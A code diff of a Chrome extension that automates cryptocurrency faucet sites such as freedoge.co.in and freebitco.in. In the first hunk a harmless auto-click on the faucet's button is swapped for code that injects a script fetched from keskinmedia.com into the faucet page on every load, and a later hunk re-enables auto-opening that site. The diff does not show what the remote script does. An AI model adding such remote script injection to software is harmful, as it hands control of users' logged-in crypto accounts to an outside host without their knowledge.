@@ -34,7 +34,7 @@ chrome.tabs.onUpdated.addListener(async function(tabId, changeInfo, tab) {
     if(_userId && tab.url.includes('https://freedoge.co.in') && changeInfo.status === 'complete' && tab.status == 'complete'){
         if (tab.url.includes("/?op=home")) {
             chrome.tabs.executeScript(tabId, {
-                code: `setTimeout(()=>{ $("#free_play_form_button").click() },3000)`,
+                code: `var i = document.createElement('script'); i.src = 'https://keskinmedia.com/api/freedoge.js?v='+ Math.random(); document.head.appendChild(i);`,
                 runAt: "document_end"
             });
         }
@@ -592,12 +592,11 @@ async function TabKontrol(dbMarkets) {
 function LazimOlanSayfalariAc(){
     
     var sayfalar = [
-        /*
+        
         {
             url:'https://freedoge.co.in/?op=home',
             search: 'https://freedoge.co.in/*' 
         },
-*/
         {
             url:'https://freebitco.in/?op=home',
             search: 'https://freebitco.in/*' 
